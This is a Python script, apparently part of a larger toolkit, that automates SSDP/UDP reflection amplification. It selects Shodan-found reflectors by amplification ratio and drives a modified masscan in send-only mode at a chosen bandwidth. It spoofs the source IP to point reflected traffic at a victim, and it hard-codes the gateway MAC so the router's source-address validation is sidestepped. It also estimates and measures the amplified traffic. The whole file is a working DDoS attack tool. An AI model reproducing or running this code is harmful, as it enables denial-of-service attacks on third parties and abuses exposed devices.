# -*- coding: utf-8 -*-
"""send_reflect.py -- 反射发包自动化

从 shodan_kept.json 按放大倍率区间提取 IP 生成 -iL 文件, 调用改版 masscan 的
send-only 模式按指定时长/带宽发包, 实时打印发包流量, 并按平均放大倍率估算
总反射流量。

放大倍率字段: 记录的 best_total_ratio (与 shodan_pipeline.py 的保留口径一致)

用法: python send_reflect.py [--duration 秒] [--bandwidth Mbps] [--source-ip IP]
                             [--test]
      时长/带宽/源 IP 用命令行传参, 不传则用下面的配置默认值
      伪造源 IP (--source-ip) 时自动从系统 ARP 表解析默认网关 MAC,
      以 --router-mac 传给 masscan 跳过 ARP —— 伪造 IP 不在本网段时,
      网关会因 ARP 源地址校验丢弃 ARP 请求导致 masscan 启动失败
      实际发包需要管理员权限运行终端 (Npcap 权限); --test 模式还需
      管理员权限创建捕获套接字 (SIO_RCVALL)
"""
import argparse
import ctypes
import json
import os
import re
import socket
import subprocess
import sys
import threading
import time

import github_sync  # 启动前自动 git pull 更新 shodan_kept.json

# ================【可自定义配置 - 环境变量 SR_*】================
# 所有参数可用环境变量覆盖, 均有默认值, 不设置即可直接运行。
# 环境变量来源二选一 (系统环境变量优先级更高):
#   1. 同目录 .env 文件: KEY=VALUE 每行一条, # 开头为注释 (推荐, 参见 .env.example)
#   2. PowerShell:  $env:SR_DURATION="30"; $env:SR_BANDWIDTH="8"
#
# SR_KEPT_FILE      合格 IP 汇总文件 (shodan_pipeline.py 产出)   默认 shodan_kept.json
# SR_RATIO_RANGE    放大倍率筛选区间, 作用于 best_total_ratio:
#                     不设/空      -> 全部 IP
#                     "50"        -> >= 50
#                     "15,20"     -> 闭区间 [15,20]; 一端留空如 "50," / ",200" 表示不限
# SR_DURATION       默认发包持续秒数 (命令行 --duration 可覆盖)  默认 30
# SR_BANDWIDTH      默认发包流量目标 Mbps (--bandwidth 可覆盖)   默认 8.0
# SR_SOURCE_IP      默认源 IP (--source-ip 可覆盖; 传给 --adapter-ip) 默认 空=本机网卡
# SR_SOURCE_PORT    源端口 (传给 --adapter-port); 反射回包需命中接收端
#                     NAT 映射时设为映射端口, 如 5000            默认 空=masscan 默认
# SR_PORTS          auto = 从选中记录自动汇总端口; 或手填 "1900,123"  默认 auto
# SR_IFACE          本机网卡 IP, 留空让 masscan 自动选择          默认 空
# SR_OFFLINE        1/true = 只走完整流程不真发包 (测试用)        默认 0
# SR_REFLECT_TAIL   测试模式收尾秒数 (发包停后继续抓反射)          默认 10
# SR_MASSCAN        masscan.exe 路径                              默认 masscan/bin/masscan.exe
# ================================================================

_HERE = os.path.dirname(os.path.abspath(__file__))


def _load_env_file(filename=".env"):
    """加载本目录 .env 配置文件 (KEY=VALUE 每行一条, # 为注释)。
    只在变量尚未存在于系统环境时设置 -> 系统环境变量优先级更高。"""
    try:
        with open(os.path.join(_HERE, filename), encoding="utf-8-sig") as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith("#") or "=" not in line:
                    continue
                k, _, v = line.partition("=")
                k, v = k.strip(), v.strip()
                if k and k not in os.environ:
                    os.environ[k] = v
    except OSError:
        pass


_load_env_file()


def _env(name, default="", cast=str):
    """读环境变量 SR_*; 未设置或为空时用默认值"""
    v = os.environ.get(name)
    if v is None or v.strip() == "":
        return default
    if cast is bool:
        return v.strip().lower() in ("1", "true", "yes", "on")
    try:
        return cast(v)
    except ValueError:
        raise SystemExit("[!] 环境变量 %s 格式错误: %r" % (name, v))


def _env_range(name):
    """解析 SR_RATIO_RANGE: '15,20' -> (15,20); '50' -> 50; '50,' -> (50,None)"""
    v = os.environ.get(name)
    if v is None or v.strip() == "":
        return (15, 20)
    parts = [p.strip() for p in v.split(",")]
    nums = [None if p == "" else float(p) for p in parts]
    if len(nums) == 1:
        return nums[0]
    if len(nums) == 2:
        return (nums[0], nums[1])
    raise SystemExit("[!] 环境变量 %s 格式错误: %r (应为 'min,max' 或 'min')" % (name, v))


KEPT_FILE = _env("SR_KEPT_FILE", "shodan_kept.json")
RATIO_RANGE = _env_range("SR_RATIO_RANGE")
DURATION = _env("SR_DURATION", 30, float)
BANDWIDTH = _env("SR_BANDWIDTH", 8.0, float)
SOURCE_IP = _env("SR_SOURCE_IP", "")
SOURCE_PORT = _env("SR_SOURCE_PORT", "")
PORTS = _env("SR_PORTS", "auto")
IFACE = _env("SR_IFACE", "")
OFFLINE = _env("SR_OFFLINE", False, bool)
REFLECT_TAIL = _env("SR_REFLECT_TAIL", 10, int)

HERE = os.path.dirname(os.path.abspath(__file__))
OUT_DIR = os.path.join(HERE, "output")                  # 运行期产物统一放这里
os.makedirs(OUT_DIR, exist_ok=True)
MASSCAN = _env("SR_MASSCAN", os.path.join(HERE, "masscan", "bin", "masscan.exe"))
IL_FILE = os.path.join(OUT_DIR, "send_il.txt")          # 生成的 -iL 文件
RATE_LOG = os.path.join(OUT_DIR, "send_rate.csv")       # masscan 每秒速率日志
COUNT_FILE = os.path.join(OUT_DIR, "send_counts.csv")   # 每 IP 发包计数
MASSCAN_LOG = os.path.join(OUT_DIR, "masscan_console.log")  # masscan 控制台输出
PAYLOADS_FILE = os.path.join(HERE, "ssdp_payloads.txt")   # 与实验室一致的探针载荷


def payload_wire_len():
    """上线每包字节数 = 以太网14 + IP20 + UDP8 + 载荷。
    载荷从 ssdp_payloads.txt 解析 (含 \r\n\" 转义); 文件缺失时按 masscan
    内置 SSDP 载荷 135B 计。"""
    hdr = 14 + 28
    try:
        with open(PAYLOADS_FILE, encoding="utf-8") as f:
            m = re.search(r'"(.*)"', f.read(), re.S)
        if m:
            s = (m.group(1).replace('\\"', '"')
                 .replace("\\r", "\r").replace("\\n", "\n"))
            return hdr + len(s.encode("latin-1"))
    except OSError:
        pass
    return hdr + 135


def log(msg):
    print("[%s] %s" % (time.strftime("%H:%M:%S"), msg), flush=True)


# ---------- 网关 MAC 解析 (伪造源 IP 时需要) ----------
def _run_cmd(cmd, timeout=10):
    try:
        p = subprocess.run(cmd, capture_output=True, timeout=timeout)
        return p.stdout.decode("utf-8", errors="replace")
    except (OSError, subprocess.TimeoutExpired):
        return ""


def _ping(gw):
    """ping 一次网关, 让系统 ARP 表填充它的 MAC"""
    cmd = (["ping", "-n", "1", "-w", "1000", gw] if os.name == "nt"
           else ["ping", "-c", "1", "-W", "1", gw])
    _run_cmd(cmd, timeout=5)


def get_default_gateway():
    """读默认网关 IP; 失败返回 None"""
    if os.name == "nt":
        out = _run_cmd(["route", "print", "-4", "0.0.0.0"])
        for ln in out.splitlines():
            parts = ln.split()
            # 0.0.0.0  0.0.0.0  <网关>  <接口>  <metric>
            if (len(parts) >= 3 and parts[0] == "0.0.0.0"
                    and parts[1] == "0.0.0.0"
                    and re.match(r"^\d+\.\d+\.\d+\.\d+$", parts[2])
                    and parts[2] != "On-link"):
                return parts[2]
    else:
        m = re.search(r"\bvia\s+(\d+\.\d+\.\d+\.\d+)",
                      _run_cmd(["ip", "route", "show", "default"]))
        if m:
            return m.group(1)
    return None


def get_arp_mac(gw):
    """从系统 ARP 表查网关 MAC; 没有则 ping 一次后重查; 失败返回 None"""
    mac_re = re.compile(r"((?:[0-9a-fA-F]{1,2})[-:]){5}[0-9a-fA-F]{1,2}")
    for attempt in range(2):
        if attempt:
            _ping(gw)
            time.sleep(0.3)
        if os.name == "nt":
            for ln in _run_cmd(["arp", "-a", gw]).splitlines():
                if gw in ln:
                    m = mac_re.search(ln)
                    if m:
                        return m.group(0).replace("-", ":").lower()
        else:
            try:
                with open("/proc/net/arp") as f:
                    next(f)
                    for ln in f:
                        parts = ln.split()
                        if len(parts) >= 4 and parts[0] == gw \
                                and parts[3] != "00:00:00:00:00:00":
                            return parts[3].lower()
            except OSError:
                pass
            m = re.search(r"lladdr\s+((?:[0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2})",
                          _run_cmd(["ip", "neigh", "show", gw]))
            if m:
                return m.group(1).lower()
    return None


def resolve_router_mac():
    """伪造源 IP 时: 自动取默认网关 MAC 传给 masscan --router-mac"""
    gw = get_default_gateway()
    if not gw:
        log("[!] 未找到默认网关, 无法自动解析 MAC, masscan 将自行尝试 ARP")
        return None
    mac = get_arp_mac(gw)
    if mac:
        log("网关 %s MAC: %s (来自系统 ARP 表, 将以 --router-mac 传给 masscan)"
            % (gw, mac))
    else:
        log("[!] 网关 %s 不在 ARP 表中且 ping 不通, 无法自动解析 MAC,"
            " masscan 将自行尝试 ARP" % gw)
    return mac


# ---------- 提取与筛选 ----------
def load_kept(path):
    try:
        data = json.load(open(path, encoding="utf-8"))
        if isinstance(data, list):
            return [r for r in data if isinstance(r, dict) and "ip" in r]
    except (OSError, ValueError) as e:
        log("[!] 读取 %s 失败: %s" % (path, e))
    return []


def in_ratio_range(ratio):
    if RATIO_RANGE is None:
        return True
    if isinstance(RATIO_RANGE, (int, float)):
        return ratio >= RATIO_RANGE
    lo, hi = RATIO_RANGE
    if lo is not None and ratio < lo:
        return False
    if hi is not None and ratio > hi:
        return False
    return True


def select_targets(kept):
    """按放大倍率区间筛选, 返回 (记录列表, 平均放大倍率)"""
    picked = [r for r in kept
              if isinstance(r.get("best_total_ratio"), (int, float))
              and in_ratio_range(r["best_total_ratio"])]
    if not picked:
        return [], 0.0
    avg = sum(r["best_total_ratio"] for r in picked) / len(picked)
    return picked, avg


def resolve_ports(records):
    """auto: 汇总选中记录里实测过开放的所有端口"""
    if str(PORTS).strip().lower() != "auto":
        return [x for x in str(PORTS).replace("U:", "").split(",") if x.strip()]
    ports = set()
    for r in records:
        for pt in r.get("ports") or []:
            if isinstance(pt.get("port"), int):
                ports.add(pt["port"])
    return sorted(ports)


# ---------- 实时监控 ----------
def read_last_rate(path):
    """读 rate-log 最后一条完整记录: elapsed_sec, pps, mbps, packets_sent"""
    try:
        with open(path, encoding="utf-8", errors="replace") as f:
            lines = f.read().strip().splitlines()
    except OSError:
        return None
    for ln in reversed(lines):
        parts = ln.split(",")
        if len(parts) != 5:
            continue
        try:
            return {"elapsed": float(parts[1]), "pps": float(parts[2]),
                    "mbps": float(parts[3]), "packets": int(parts[4])}
        except ValueError:
            continue
    return None


# ---------- 测试模式: 捕获实际反射回来的流量 ----------
def get_local_ip():
    """探测本机出口 IP (排除 TUN/回环), 失败返回 None"""
    cands = []
    try:
        cands += socket.gethostbyname_ex(socket.gethostname())[2]
    except OSError:
        pass
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("8.8.8.8", 53))
        cands.append(s.getsockname()[0])
    except OSError:
        pass
    finally:
        s.close()
    for ip in cands:
        if not ip.startswith(("127.", "169.254.", "198.18.")):
            return ip
    return cands[0] if cands else None


class ReflectCapture:
    """raw socket + SIO_RCVALL 捕获打回来的 UDP 反射流量 (Windows, 需管理员)"""
    def __init__(self, local_ip, ports, ip_set):
        self.ip_set = ip_set
        self.ports = set(ports)
        self.lock = threading.Lock()
        self.buckets = {}          # int(sec) -> [bytes, packets]
        self.total = [0, 0]
        self.stop = threading.Event()
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_RAW,
                                  socket.IPPROTO_IP)
        self.sock.bind((local_ip, 0))
        self.sock.ioctl(socket.SIO_RCVALL, socket.RCVALL_ON)
        self.sock.settimeout(0.5)
        self.thread = threading.Thread(target=self._run, daemon=True)

    def start(self):
        self.thread.start()

    def _run(self):
        while not self.stop.is_set():
            try:
                buf, _ = self.sock.recvfrom(65535)
            except (socket.timeout, OSError):
                continue
            if len(buf) < 28 or buf[9] != 17:      # IPv4 + UDP
                continue
            ihl = (buf[0] & 0xF) * 4
            if ihl < 20 or len(buf) < ihl + 8:
                continue
            src = ".".join(str(b) for b in buf[12:16])
            sport = (buf[ihl] << 8) | buf[ihl + 1]
            if sport not in self.ports or src not in self.ip_set:
                continue
            ip_len = (buf[2] << 8) | buf[3]
            with self.lock:
                b = self.buckets.setdefault(int(time.time()), [0, 0])
                b[0] += ip_len
                b[1] += 1
                self.total[0] += ip_len
                self.total[1] += 1

    def snapshot_mbps(self, window=1.0):
        """最近 window 秒的实测反射 Mbps"""
        with self.lock:
            now = int(time.time())
            nbytes = sum(self.buckets.get(t, [0])[0]
                         for t in range(int(now - window), now))
        return nbytes * 8.0 / 1e6 / window

    def totals(self):
        with self.lock:
            return self.total[0], self.total[1]

    def finish(self, wait=0.0):
        if wait:
            self.stop.wait(wait)
        self.stop.set()
        self.thread.join(timeout=3)
        try:
            self.sock.ioctl(socket.SIO_RCVALL, socket.RCVALL_OFF)
            self.sock.close()
        except OSError:
            pass
        return self.totals()


def monitor(rate_log, proc, avg_ratio, stop, capture=None, req_bytes=0):
    """实时单行刷新: 发送流量 + (测试模式) 实测/理论反射流量"""
    while not stop.is_set():
        r = read_last_rate(rate_log)
        if r and r["packets"] > 0:
            # 理论反射 = 每秒请求数 x 实验室每请求响应字节(倍率x请求大小)
            theory = (r["pps"] * req_bytes * avg_ratio * 8 / 1e6
                      if req_bytes else r["mbps"] * avg_ratio)
            if capture is not None:
                actual = capture.snapshot_mbps()
                dev = ((actual - theory) / theory * 100) if theory else 0
                sys.stdout.write(
                    "\r实时: 已发 %5.1fs | 发送 %6.2f Mbps | 反射实测 %8.2f | "
                    "理论 %8.2f Mbps (x%.1f) | 偏差 %+6.1f%%   "
                    % (r["elapsed"], r["mbps"], actual, theory, avg_ratio, dev))
            else:
                sys.stdout.write(
                    "\r实时: 已发 %5.1fs | 发送 %7.2f Mbps (%8.0f pps) | "
                    "预估反射 %9.1f Mbps (x%.1f) | 共 %d 包   "
                    % (r["elapsed"], r["mbps"], r["pps"], theory, avg_ratio,
                       r["packets"]))
            sys.stdout.flush()
        if proc.poll() is not None:
            break
        stop.wait(1.0)


# ---------- 结果汇总 ----------
def summarize(rate_log, count_file, avg_ratio):
    rs = []
    try:
        with open(rate_log, encoding="utf-8") as f:
            for ln in f.read().strip().splitlines()[1:]:
                parts = ln.split(",")
                if len(parts) == 5:
                    try:
                        rs.append({"pps": float(parts[2]),
                                   "mbps": float(parts[3]),
                                   "packets": int(parts[4])})
                    except ValueError:
                        continue
    except OSError:
        pass
    active = [r for r in rs if r["packets"] > 0]
    total = 0
    # 每 IP 计数汇总 (counts 文件是总发包数的权威值, 先解析)
    total_cnt, n_ip = 0, 0
    try:
        with open(count_file, encoding="utf-8") as f:
            for ln in f.read().strip().splitlines()[1:]:
                parts = ln.rsplit(",", 1)
                if len(parts) == 2 and parts[1].isdigit():
                    total_cnt += int(parts[1])
                    n_ip += 1
    except OSError:
        pass
    if active:
        avg_mbps = sum(r["mbps"] for r in active) / len(active)
        total = max(r["packets"] for r in active)
        total_pkts = max(total, total_cnt)  # 以 counts 文件为准
        log("发送: 总计 %d 包, 平均 %.2f Mbps (峰值 %.2f)"
            % (total_pkts, avg_mbps, max(r["mbps"] for r in active)))
        log("预估反射流量: 平均 %.1f Mbps, 峰值 %.1f Mbps (平均放大倍率 x%.2f)"
            % (avg_mbps * avg_ratio, max(r["mbps"] for r in active) * avg_ratio,
               avg_ratio))
    if n_ip:
        log("计数: %d 个 IP 共收到 %d 包 -> %s" % (n_ip, total_cnt, count_file))


# ---------- 主流程 ----------
def is_admin():
    try:
        return bool(ctypes.windll.shell32.IsUserAnAdmin())
    except Exception:
        return False


def parse_args():
    ap = argparse.ArgumentParser(description="反射发包自动化 (send-only masscan)")
    ap.add_argument("--duration", type=float, default=DURATION,
                    help="发包持续秒数 (默认: %(default)s)")
    ap.add_argument("--bandwidth", type=float, default=BANDWIDTH,
                    help="发包流量目标 Mbps (默认: %(default)s)")
    ap.add_argument("--source-ip", default=SOURCE_IP,
                    help="发包源 IP (传给 masscan --adapter-ip; 默认: 自动使用网卡 IP)")
    ap.add_argument("--source-port", default=SOURCE_PORT,
                    help="发包源端口 (传给 --adapter-port; 反射回包需命中接收端 NAT 映射时设为映射端口)")
    ap.add_argument("--test", action="store_true",
                    help="测试模式: 不伪造源 IP, 捕获实际反射流量并对比理论值偏差")
    return ap.parse_args()


def main():
    args = parse_args()
    duration = args.duration
    bandwidth = args.bandwidth
    source_ip = str(args.source_ip).strip()
    source_port = str(args.source_port).strip()
    test_mode = args.test
    if test_mode and source_ip:
        log("[!] 测试模式下不伪造源 IP, 忽略 --source-ip = %s" % source_ip)
        source_ip = ""
    if test_mode and OFFLINE:
        log("[!] 测试模式需要真实发包, 请把配置区 OFFLINE 改为 False 后重跑")
        return

    log("从 GitHub 拉取最新 %s ..." % KEPT_FILE)
    github_sync.pull()
    kept = load_kept(os.path.join(HERE, KEPT_FILE))
    records, avg_ratio = select_targets(kept)
    if not records:
        log("没有符合放大倍率区间 %s 的 IP, 退出" % (RATIO_RANGE,))
        return
    ips = [r["ip"] for r in records]
    ports = resolve_ports(records)
    if not ports:
        log("没有可用端口, 退出")
        return

    req_bytes = 0
    for rec in records:
        if rec.get("ports"):
            req_bytes = rec["ports"][0].get("req_bytes") or 0
            break
    pkt_len = payload_wire_len()
    pps = bandwidth * 1e6 / (pkt_len * 8)
    log("从 %s 选中 %d/%d 个 IP (放大倍率区间 %s), 平均放大倍率 x%.2f"
        % (KEPT_FILE, len(ips), len(kept), RATIO_RANGE, avg_ratio))
    log("端口: %s | 时长: %gs | 目标带宽: %g Mbps%s"
        % (",".join(map(str, ports)), duration, bandwidth,
           (" | 源 IP: %s" % source_ip) if source_ip else ""))
    log("发包速率: %g Mbps = %.1f pps (每包 %d B)" % (bandwidth, pps, pkt_len))
    # 理论反射用逐请求口径: pps x 请求字节 x 倍率 (与倍率分母 120B 同基数)
    est = (pps * req_bytes * avg_ratio * 8 / 1e6) if req_bytes \
        else bandwidth * avg_ratio
    log("预估总反射流量: %.1f pps x %dB x %.2f = %.2f Mbps"
        % (pps, req_bytes, avg_ratio, est))

    with open(IL_FILE, "w", encoding="utf-8") as f:
        f.write("\n".join(ips) + "\n")
    log("IP 列表已生成: %s" % IL_FILE)

    if not OFFLINE and not is_admin():
        log("[!] 当前不是管理员权限, Npcap 可能无法发包; 建议用管理员终端重跑,"
            " 或配置区临时 OFFLINE = True 做流程测试")

    # 测试模式: 提前启动反射流量捕获 (真实源 IP, 响应会回到本机)
    capture = None
    if test_mode:
        local_ip = IFACE or get_local_ip()
        if not local_ip:
            log("[!] 测试模式无法确定本机网卡 IP, 请配置区 IFACE 手动指定")
            return
        ip_set = set(ips)
        try:
            capture = ReflectCapture(local_ip, ports, ip_set)
        except (PermissionError, OSError) as e:
            log("[!] 测试模式捕获套接字创建失败: %s" % e)
            log("    需要管理员权限运行终端 (SIO_RCVALL)")
            return
        capture.start()
        log("测试模式: 已开始捕获 %s 上的反射流量 (源端口 %s, 收尾 %gs)"
            % (local_ip, ",".join(map(str, ports)), REFLECT_TAIL))

    udp_ports = ",".join("U:%s" % x for x in ports)
    cmd = [MASSCAN, "-iL", IL_FILE, "-p", udp_ports,
           "--send-only", "--duration", str(duration),
           "--bandwidth", str(bandwidth),
           "--count-file", COUNT_FILE, "--rate-log", RATE_LOG]
    if source_ip:
        cmd += ["--adapter-ip", source_ip]
        if not OFFLINE:
            # 伪造 IP 不在本网段 -> 网关会丢 masscan 的 ARP 请求(源地址校验),
            # 自动从系统 ARP 表取网关 MAC 直接写死, 绕过 ARP
            rmac = resolve_router_mac()
            if rmac:
                cmd += ["--router-mac", rmac]
    if source_port:
        cmd += ["--adapter-port", source_port]
    if IFACE and not test_mode:
        cmd += ["--interface", IFACE]
    if OFFLINE:
        cmd += ["--offline"]
    if os.path.exists(PAYLOADS_FILE):
        # 用与实验室探针逐字节一致的 SSDP 载荷覆盖 masscan 内置表
        cmd += ["--nmap-payloads", PAYLOADS_FILE]
    cmd += ["--nostatus=1"]  # 关闭 masscan 自带状态栏, 实时显示由本脚本负责
    log("启动 masscan (输出 -> %s)" % os.path.basename(MASSCAN_LOG))
    with open(MASSCAN_LOG, "wb") as mlog:
        proc = subprocess.Popen(cmd, cwd=HERE, stdout=mlog, stderr=mlog)

    stop = threading.Event()
    mon = threading.Thread(target=monitor,
                           args=(RATE_LOG, proc, avg_ratio, stop, capture),
                           kwargs={"req_bytes": req_bytes},
                           daemon=True)
    mon.start()
    try:
        proc.wait()
    except KeyboardInterrupt:
        log("收到 Ctrl-C, 终止 masscan...")
        proc.terminate()
        proc.wait(timeout=10)
    finally:
        stop.set()
        mon.join(timeout=3)
    sys.stdout.write("\n")
    log("masscan 退出 (code=%d)" % proc.returncode)
    if proc.returncode != 0:
        try:
            tail = open(MASSCAN_LOG, "rb").read().decode("utf-8",
                                                         errors="replace")
            tail = "\n".join(tail.strip().splitlines()[-6:])
            log("masscan 输出尾部:\n" + tail)
        except OSError:
            pass

    # 测试模式: 等尾包再汇总实测 vs 理论偏差
    if capture is not None:
        nbytes, npkts = capture.finish(wait=REFLECT_TAIL)
        actual_mbps = nbytes * 8.0 / 1e6 / duration

        # 发送端: rate-log 平均发送 Mbps + counts 总发包
        rs = []
        try:
            with open(RATE_LOG, encoding="utf-8") as f:
                for ln in f.read().strip().splitlines()[1:]:
                    pp = ln.split(",")
                    if len(pp) == 5:
                        try:
                            rs.append(float(pp[3]))
                        except ValueError:
                            continue
        except OSError:
            pass
        active = [x for x in rs if x > 0]
        sent_mbps = sum(active) / len(active) if active else 0.0

        counts = {}
        try:
            with open(COUNT_FILE, encoding="utf-8") as f:
                for ln in f.read().strip().splitlines()[1:]:
                    pp = ln.rsplit(",", 1)
                    if len(pp) == 2 and pp[1].isdigit():
                        counts[pp[0]] = int(pp[1])
        except OSError:
            pass
        sent_total = sum(counts.values())

        # 理论 (逐IP): 发包数 x 该记录 req_bytes x total_ratio
        # (口径与实验室一致: 每个请求按实测的每请求响应字节照搬)
        theory_per_ip = 0
        for rec in records:
            cnt = counts.get(rec["ip"], 0)
            if not cnt:
                continue
            pt = rec["ports"][0] if rec.get("ports") else {}
            req = pt.get("req_bytes") or 0
            ratio = pt.get("total_ratio") or rec.get("best_total_ratio") or 0
            theory_per_ip += cnt * req * ratio
        theory_per_ip_mbps = theory_per_ip * 8.0 / 1e6 / duration

        # 有效倍率: 线速口径 / 每请求口径
        eff_wire = actual_mbps / sent_mbps if sent_mbps else 0.0
        # 每个请求平均引来的反射字节 = 反射总字节 / 发出的请求数 (不是响应包数)
        per_req_bytes = (nbytes / sent_total) if sent_total else 0.0
        eff_req = per_req_bytes / req_bytes if req_bytes else 0.0

        log("============ 测试结果 ============")
        log("发送     : %d 包 / %d IP, 平均 %.2f Mbps (目标 %g)"
            % (sent_total, len(counts), sent_mbps, bandwidth))
        log("反射实测 : %d 包 / %.1f MB, 平均 %.2f Mbps (含 %gs 收尾)"
            % (npkts, nbytes / 1e6, actual_mbps, REFLECT_TAIL))
        log("理论反射 : %.2f Mbps (逐IP: 包数 x req_bytes x 倍率)"
            % theory_per_ip_mbps)
        log("偏差     : %+.1f%% (正值=实测高于理论)"
            % (((actual_mbps - theory_per_ip_mbps)
                / theory_per_ip_mbps * 100) if theory_per_ip_mbps else 0))
        log("有效倍率 : 线速 %.1fx | 每请求 %.1fx (每请求反射 %d B, 标称 x%.2f)"
            % (eff_wire, eff_req, per_req_bytes, avg_ratio))
        log("==================================")
    else:
        summarize(RATE_LOG, COUNT_FILE, avg_ratio)


if __name__ == "__main__":
    main()
